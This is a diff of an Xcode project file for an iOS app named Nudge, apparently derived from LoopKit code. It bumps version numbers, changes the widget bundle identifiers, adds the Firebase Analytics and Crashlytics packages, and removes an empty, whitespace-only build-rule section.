 				DEVELOPMENT_TEAM = "";
 				DYLIB_COMPATIBILITY_VERSION = 1;
@@ -4179,6 +4053,7 @@
 					"@executable_path/Frameworks",
 					"@loader_path/Frameworks",
 				);
+				MARKETING_VERSION = 0.1.1;
 				MTL_FAST_MATH = YES;
 				PRODUCT_BUNDLE_IDENTIFIER = com.loopkit.LoopCore;
 				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
@@ -4282,6 +4157,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = PU6D3H32MB;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = "Loop Status Extension/Info.plist";
@@ -4290,7 +4166,9 @@
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER).statuswidget";
+				MAIN_APP_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
+				MARKETING_VERSION = 0.1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.nudgebg.Nudge.statuswidget;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SKIP_INSTALL = YES;
@@ -4308,6 +4186,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 10;
 				DEVELOPMENT_TEAM = PU6D3H32MB;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = "Loop Status Extension/Info.plist";
@@ -4316,7 +4195,9 @@
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER).statuswidget";
+				MAIN_APP_BUNDLE_IDENTIFIER = com.nudgebg.Nudge;
+				MARKETING_VERSION = 0.1.1;
+				PRODUCT_BUNDLE_IDENTIFIER = com.nudgebg.Nudge.statuswidget;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				SKIP_INSTALL = YES;
@@ -4332,7 +4213,7 @@
 				CLANG_WARN_SUSPICIOUS_MOVES = YES;
 				CODE_SIGN_IDENTITY = "";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
-				CURRENT_PROJECT_VERSION = 57;
+				CURRENT_PROJECT_VERSION = 10;
 				DEFINES_MODULE = YES;
 				DEVELOPMENT_TEAM = "";
 				DYLIB_COMPATIBILITY_VERSION = 1;
@@ -4345,6 +4226,7 @@
 					"@executable_path/Frameworks",
 					"@loader_path/Frameworks",
 				);
+				MARKETING_VERSION = 0.1.1;
 				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER).LoopUI";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
@@ -4365,7 +4247,7 @@
 				CLANG_WARN_SUSPICIOUS_MOVES = YES;
 				CODE_SIGN_IDENTITY = "";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
-				CURRENT_PROJECT_VERSION = 57;
+				CURRENT_PROJECT_VERSION = 10;
 				DEFINES_MODULE = YES;
 				DEVELOPMENT_TEAM = "";
 				DYLIB_COMPATIBILITY_VERSION = 1;
@@ -4378,6 +4260,7 @@
 					"@executable_path/Frameworks",
 					"@loader_path/Frameworks",
 				);
+				MARKETING_VERSION = 0.1.1;
 				PRODUCT_BUNDLE_IDENTIFIER = "$(MAIN_APP_BUNDLE_IDENTIFIER).LoopUI";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
@@ -4501,128 +4384,6 @@
 		};
 /* End XCConfigurationList section */
 
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
-
 /* Begin XCRemoteSwiftPackageReference section */
 		0185F5E326267DB700136A76 /* XCRemoteSwiftPackageReference "Alamofire" */ = {
 			isa = XCRemoteSwiftPackageReference;
@@ -4648,6 +4409,14 @@
 				minimumVersion = 3.3.3;
 			};
 		};
+		01AFACC8264A072E003D8F6B /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 7.11.1;
+			};
+		};
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
@@ -4665,6 +4434,16 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 0185F5F726267E4300136A76 /* XCRemoteSwiftPackageReference "PhoneNumberKit" */;
 			productName = PhoneNumberKit;
+		};
+		01AFACC9264A072E003D8F6B /* FirebaseAnalytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 01AFACC8264A072E003D8F6B /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalytics;
+		};
+		01AFACCB264A072E003D8F6B /* FirebaseCrashlytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 01AFACC8264A072E003D8F6B /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseCrashlytics;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
